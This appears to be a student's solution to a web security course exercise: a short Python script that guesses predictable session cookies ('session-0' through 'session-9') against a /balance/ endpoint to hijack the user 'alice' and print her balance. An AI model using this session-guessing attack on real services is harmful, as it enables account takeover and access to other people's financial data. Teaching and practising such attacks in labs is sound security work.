import sys
import requests
import json


def test_session(address):
    # write your code here
    response = 0
    address += "/balance/"
    for num in range(10):
        session_value = 'session-'+str(num)
        reqst = requests.get(address, cookies = {"sessionid":session_value})
        if reqst.status_code == 200:
           #page found read the data for alice
            data = json.loads(reqst.text)
            if data['username'] == "alice":
                response = data['balance']

    return response

def main(argv):
	address = sys.argv[1]
	print(test_session(address))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
